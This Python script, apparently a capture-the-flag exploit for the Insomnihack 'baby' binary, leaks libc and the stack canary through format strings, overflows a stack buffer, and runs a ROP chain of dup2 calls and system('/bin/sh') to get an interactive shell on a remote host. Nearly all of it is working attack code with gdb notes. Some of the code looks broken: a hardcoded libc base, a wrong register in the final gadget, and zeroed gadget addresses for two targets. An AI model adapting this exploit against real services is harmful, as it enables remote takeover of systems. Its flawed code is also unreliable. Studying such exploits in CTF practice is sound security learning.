#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''

Strategy:
==========
1. Leak a libc address from the stack and calculate the libc base address
2. Leak the stack cookie
3. Trigger the buffer overflow and get RIP control
4. Do some rop magic

Tricks:
========
Rename to libc.so.6 and:
LD_LIBRARY_PATH=. ./baby


1)  Cookie stored at the beginning of the function at [rbp - 8]
 
Cookie breakpoint               https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/
br *dofmt+17 
   0x7f379ee674d9 <dofmt+17>:   mov    rax,QWORD PTR fs:0x28         // copy canary pointer into RAX
=> 0x7f379ee674e2 <dofmt+26>:   mov    QWORD PTR [rbp-0x8],rax       // copy the canary content into RAX
   0x7f379ee674e6 <dofmt+30>:   xor    eax,eax                       // zero out the canary 

br *dofmt+135

        RAX: 0x83511eb77edda800 

br *dostack+160
   0x7fd9efbe14b2 <dostack+160>:    mov    rcx,QWORD PTR [rbp-0x8]
=> 0x7fd9efbe14b6 <dostack+164>:    xor    rcx,QWORD PTR fs:0x28
   0x7fd9efbe14bf <dostack+173>:    je     0x7fd9efbe14c6 <dostack+180>
   0x7fd9efbe14c1 <dostack+175>:    call   0x7fd9efbe0e30 <__stack_chk_fail@plt>
        
        RCX: 0xec3c87dd37f3f200 


2) Libc and system
> rabin2 -s libc.so.6 | grep system
vaddr=0x00045390 paddr=0x00045390 ord=584 fwd=NONE sz=45 bind=GLOBAL type=FUNC name=__libc_system


3)  Overflow RIP
    
    Payload  = "A"* 1032 + cookie + RBP + RIP


4) Build the ROP chain

According to the x86_64 ABI, the first 6 integer or pointer arguments to a function are passed in registers. 
The first is placed in rdi, the second in rsi, the third in rdx, and then rcx, r8 and r9. 
Only the 7th argument and onwards are passed on the stack.

    RDI
    RSI
    RDX
    RCX
    R8
    R9

 Registers controlled after crash
 =================================

    RBP: 0x4545454545454545 ('EEEEEEEE')
    RSP: 0x7ffe895c44e8 ("DDDDDDDDAAA%AAsAABAA$AAn
    RIP: 0x7fc5e80e94c7 (<dostack+181>: ret)
    R13: 0x7ffe895c4650 ("A%pA%TA%qA%UA%r", 'A' <repeats 185 times>...)   //  [R13] --> offset 352 - size ~43

 Possible gadgets
 ==================
    1) Get "/bin/sh" into RDI
        0x000000000001f6b2 : pop rdi ; pop rbp ; ret
        0x0000000000022482 : pop rdi ; ret
        0x00000000000e8629 : pop rax ; pop rdi ; call rax

    2) Get system() into RPI
        

    3) Jump into system
        0x00000000000037ec : pop rsp ; ret
        0x0000000000000937 : ret  // ??


    gdb-peda$ find "/bin/sh"
    Searching for '/bin/sh' in: None ranges
    Found 2 results, display max 2 items:
      libc : 0x7fc5e7c7d3e8 --> 0x68732f6e69622f ('/bin/sh')
    [heap] : 0x7fc5e9acf05b --> 0x68732f6e69622f ('/bin/sh')






br *dostack+180
set follow-fork-mode child
c

'''

import re
import sys 
import socket  
import struct  
import telnetlib
from pwn import *


def perror():
    sys.exit("python {0} [remote|local] [remote|ubuntu1404|debian8]".format(sys.argv[0]))


def check_args():
    PORT = 1337
    oses = ["remote", "ubuntu1404", "debian8"]

    try:
        arg1 = str(sys.argv[1])
        arg2 = str(sys.argv[2])
    except:
        perror()

    if (arg1 == "" or arg2 == ""):
        perror()
    elif (arg2 not in oses):
        perror()

    if (arg1 == "remote"):
        HOST = "baby.teaser.insomnihack.ch"
    elif (arg1 == "local"):
        HOST = "127.0.0.1"
    else:
        perror()      

    return HOST, PORT, arg2


def chain2stringx64(rop):
    return "".join([p64(x) for x in rop])


def pause():
    print "[*] Paused, press ENTER to continue."
    raw_input()


def dofmt(s):
    choice="2"

    global libc, cookie

    s.readuntil("> ")
    s.sendline(choice)
    s.readuntil("> ")
    s.sendline("%158$llx")      
    libc_str = s.recvline().strip()
    libc = int(libc_str,16)
    log.info("2.dofmt()=> Leaking <__libc_start_main+245> at: {:x}".format(libc))
    

    #s.sendline(choice)
    s.readuntil("> ")
    s.sendline("%138$llx")
    cookie = s.recvline().strip()
    cookie = (re.search(r"[0-9A-Fa-f]{16}", cookie)).group(0)
    log.info("2.dofmt()=> Leaking stack cookie: {}".format(cookie))
    print "cookie:%s:" %cookie
    assert(len(cookie) == 16)
    cookie = p64(int(cookie,16))
    
    #pause()

    # Back to main menu
    s.sendline("")


def  dostack(s, os_target):
    log.info("1.dostack()=> ")

    choice = "1"
    
    # Generate payload
    RBP = "EEEEEEEE"
    RIP = "DDDDDDDD"
    ROPCHAIN = rop(os_target)

    # buff = "A"* 1032 + cookie + RBP + RIP 
    buff = "A"* 1032 + cookie + RBP + ROPCHAIN

    log.info("Sending choice {}".format(choice))
    s.sendline(choice)
    
    s.readuntil("bytes you want to send ? ")
    buffsz = str(len(buff))
    s.sendline(buffsz)
    s.sendline(buff)

    return s  


def rop(os_target):  
    try:
        log.info("Building ROP chain")
        
        # Calculate libc base address    
        libc = 0x00007f5d95888000

        if os_target == "debian8":
            # gadgets
            pop_rdi_ret     = libc + 0x22482
            pop_rsi_ret     = libc + 0x24125
            pop_rsi_r15_ret = libc + 0x22480

            # offsets
            system = libc + 0x41490
            dup2   = libc + 0xdc240
            binsh  = libc + 0x1633e8


        elif os_target == "ubuntu1404":
            pop_rdi_ret = 0x0
        elif os_target == "remote":
            pop_rdi_ret = 0x0
        else:  #local
            perror()

        # ROP attack => dup(4,0); dup(4,1); system("/bin/sh")
        ropchain = [
            pop_rdi_ret ,
            4           ,  # rdi = 4 
            pop_rsi_ret ,
            0           ,  # rsi = 0
            dup2        ,  # dup2(4,0)

            pop_rdi_ret ,
            4           ,  # rdi = 4 
            pop_rsi_ret ,
            1           ,  # rsi = 1
            dup2        ,  # dup2(4,1)

            pop_rsi_ret ,
            binsh       ,  # rdi = "/bin/sh\x00"
            system      ,  # rsp = system()
        ]
               
        print "1st gadget at: ", hex(ropchain[0])
        print "2st gadget at: ", hex(ropchain[2])
        
        return chain2stringx64(ropchain)

    except socket.errno:
        raise


def main():
    # check input
    host, port, os_target = check_args()

    # Create connection
    s = remote(host, port)

    # leak libc and stack cookie
    dofmt(s)

    # Trigger the stack-based buffer overflow doing some ROP magic
    s = dostack(s, os_target)

    log.info("got root?")
    s.interactive()
    


if __name__ == '__main__':  
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)